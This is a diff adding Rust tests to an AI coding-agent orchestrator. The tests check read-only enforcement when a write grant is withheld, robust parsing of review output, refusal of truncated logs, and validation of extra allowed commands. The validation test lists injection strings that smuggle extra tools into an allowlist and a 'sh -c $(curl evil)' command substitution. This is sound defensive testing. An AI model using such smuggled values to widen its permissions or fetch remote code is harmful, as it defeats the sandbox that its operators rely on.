@@ -13,7 +13,18 @@ mod tests {
             timeout: Duration::from_secs(90),
             idle_timeout: Duration::from_secs(30),
             permission,
-            effective_permissions: agentflow_contracts::EffectivePermissions::default(),
+            // Mirror what the orchestrator computes: a developer run carries an explicit
+            // worktree-write grant, everything else is read-only.
+            effective_permissions: agentflow_contracts::EffectivePermissions {
+                worktree_read: true,
+                worktree_write: role == RunRole::Developer,
+                sandbox_guarantee: if role == RunRole::Developer {
+                    agentflow_contracts::SandboxGuarantee::WorktreeRestricted
+                } else {
+                    agentflow_contracts::SandboxGuarantee::ReadOnly
+                },
+                ..Default::default()
+            },
             resume_session_id: None,
             permission_hook_program: None,
             extra_allowed_commands: Vec::new(),
@@ -125,6 +136,94 @@ mod tests {
     #[test]
     fn review_parser_rejects_prose_without_a_result_object() {
         assert!(parse_review("review completed without structured output").is_err());
+    }
+
+    #[test]
+    fn review_parser_survives_a_stray_unmatched_brace_in_prose()
+    -> Result<(), Box<dyn std::error::Error>> {
+        // A bare `{` in prose (a placeholder, a truncated code sample) must not swallow every
+        // JSON object that follows it.
+        let output = format!(
+            "note: template uses {{placeholder without a closing brace\n{}",
+            passing_review("still found the result")
+        );
+        let review = parse_review(&output)?;
+        assert_eq!(review.summary, "still found the result");
+        Ok(())
+    }
+
+    #[test]
+    fn candidate_scan_ignores_braces_inside_prose_quotes()
+    -> Result<(), Box<dyn std::error::Error>> {
+        // A quote outside an object still opens a string, so an unbalanced brace inside it
+        // cannot unbalance the scan.
+        let output = format!(
+            "the agent said \"use {{ to open a block\" then returned:\n{}",
+            passing_review("quoted brace handled")
+        );
+        assert_eq!(parse_review(&output)?.summary, "quoted brace handled");
+        Ok(())
+    }
+
+    #[tokio::test]
+    async fn a_truncated_provider_log_is_never_used_to_recover_a_result()
+    -> Result<(), Box<dyn std::error::Error>> {
+        let temp = tempfile::tempdir()?;
+        let run_dir = temp.path();
+        // A complete, schema-valid draft sits in the log: without the truncation guard it would
+        // be accepted as the authoritative deliverable.
+        tokio::fs::write(
+            run_dir.join("stdout.log"),
+            json!({
+                "schema_version": 1,
+                "task_id": "task-1",
+                "revision": 2,
+                "status": "completed",
+                "summary": "中途草稿",
+                "changed_files": []
+            })
+            .to_string(),
+        )
+        .await?;
+        tokio::fs::write(
+            run_dir.join("process-outcome.json"),
+            json!({
+                "pid": 4242,
+                "started_at": "2026-07-27T00:00:00Z",
+                "exit_code": 0,
+                "timed_out": false,
+                "idle_timed_out": false,
+                "cancelled": false,
+                "log_truncated": true
+            })
+            .to_string(),
+        )
+        .await?;
+        let Err(error) = read_development_output(run_dir, "claude").await else {
+            return Err("a truncated log must not yield a result".into());
+        };
+        assert!(error.to_string().contains("truncated"), "{error}");
+
+        // With the same log but no truncation, recovery still works as before.
+        tokio::fs::write(
+            run_dir.join("process-outcome.json"),
+            json!({
+                "pid": 4242,
+                "started_at": "2026-07-27T00:00:00Z",
+                "exit_code": 0,
+                "timed_out": false,
+                "idle_timed_out": false,
+                "cancelled": false,
+                "log_truncated": false
+            })
+            .to_string(),
+        )
+        .await?;
+        assert_eq!(
+            read_development_output(run_dir, "claude").await?.summary,
+            "中途草稿"
+        );
+        Ok(())
     }
 
     #[test]
@@ -331,6 +430,133 @@ mod tests {
                 .windows(2)
                 .any(|value| value == ["--resume", "session-123"])
         );
+    }
+
+    #[test]
+    fn a_withheld_write_grant_forces_every_cli_into_read_only_mode() {
+        // The broker's verdict used to be advisory for built-in CLIs: they derived read-only
+        // from role and tier only, so a development run whose write grant was withheld still
+        // started the Provider in a writable mode.
+        let mut request = test_request(RunRole::Developer, PermissionTier::Normal);
+        assert!(!request.is_read_only(), "a granted developer run may write");
+        request.effective_permissions.worktree_write = false;
+        assert!(request.is_read_only());
+
+        assert!(
+            claude_args(&request)
+                .windows(2)
+                .any(|value| value == ["--disallowedTools", "Write,Edit"])
+        );
+        assert!(
+            codex_args(&request, Path::new("/tmp/review.schema.json"))
+                .windows(2)
+                .any(|value| value == ["--sandbox", "read-only"])
+        );
+        assert!(
+            gemini_args(&request)
+                .windows(2)
+                .any(|value| value == ["--approval-mode", "plan"])
+        );
+        assert!(
+            qoder_args(&request)
+                .windows(2)
+                .any(|value| value == ["--permission-mode", "plan"])
+        );
+        assert!(
+            grok_args(&request)
+                .windows(2)
+                .any(|value| value == ["--permission-mode", "plan"])
+        );
+
+        // A withheld grant also outranks the Yolo escape hatch.
+        request.permission = PermissionTier::Yolo;
+        assert!(
+            codex_args(&request, Path::new("/tmp/review.schema.json"))
+                .windows(2)
+                .any(|value| value == ["--sandbox", "read-only"])
+        );
+    }
+
+    #[test]
+    fn only_providers_with_a_real_broker_claim_one() {
+        // Everything else runs development work under its own auto-approval mode; the
+        // orchestrator records that fact per run instead of leaving it implied.
+        let schema = Path::new("/tmp/review.schema.json");
+        assert!(
+            ClaudeCodeAdapter::new("claude")
+                .capabilities()
+                .permission_broker
+        );
+        for adapter in [
+            Box::new(CodexAdapter::new("codex", schema.to_path_buf())) as Box<dyn AgentAdapter>,
+            Box::new(GeminiCliAdapter::new("gemini")),
+            Box::new(QwenCodeAdapter::new("qwen", schema.to_path_buf())),
+            Box::new(QoderCliAdapter::new("qodercli")),
+            Box::new(GrokCliAdapter::new("grok")),
+        ] {
+            assert!(
+                !adapter.capabilities().permission_broker,
+                "{} claims a permission broker it does not implement",
+                adapter.kind()
+            );
+        }
+    }
+
+    #[test]
+    fn extra_allowed_commands_reject_list_separator_injection() {
+        // Claude joins these into one comma-separated --allowedTools value, so a comma or a
+        // closing paren would declare extra tools the Bash-only permission hook never sees.
+        for injection in [
+            "git fetch:*),WebFetch,WebSearch,Bash(curl",
+            "cargo test,WebFetch",
+            "bun test)",
+            "sh -c $(curl evil)",
+            "cargo test\nWebFetch",
+            "",
+        ] {
+            assert!(
+                validate_extra_allowed_command(injection).is_err(),
+                "injection was accepted: {injection:?}"
+            );
+        }
+        for legitimate in [
+            "cargo test",
+            "bun test --watch",
+            "npm run build",
+            "./scripts/verify.sh",
+            "docker compose up",
+            "make -j4",
+        ] {
+            assert!(
+                validate_extra_allowed_command(legitimate).is_ok(),
+                "legitimate command was rejected: {legitimate:?}"
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn an_injected_extra_allowed_command_never_reaches_a_provider_process()
+    -> Result<(), Box<dyn std::error::Error>> {
+        let temp = tempfile::tempdir()?;
+        let mut request = test_request(RunRole::Developer, PermissionTier::Normal);
+        request.run_dir = temp.path().join("run");
+        request.worktree = temp.path().to_path_buf();
+        request.extra_allowed_commands = vec!["git fetch:*),WebFetch,Bash(curl".into()];
+        let (tx, _rx) = mpsc::channel(1);
+        let started = start_process(
+            "claude",
+            PathBuf::from("/bin/echo"),
+            Vec::new(),
+            request,
+            CancellationToken::new(),
+            tx,
+        )
+        .await;
+        match started {
+            Err(AdapterError::Incompatible(_)) => Ok(()),
+            Err(other) => Err(format!("unexpected error: {other}").into()),
+            Ok(_) => Err("injected allowed command must fail the run before spawning".into()),
+        }
     }
 
     #[test]
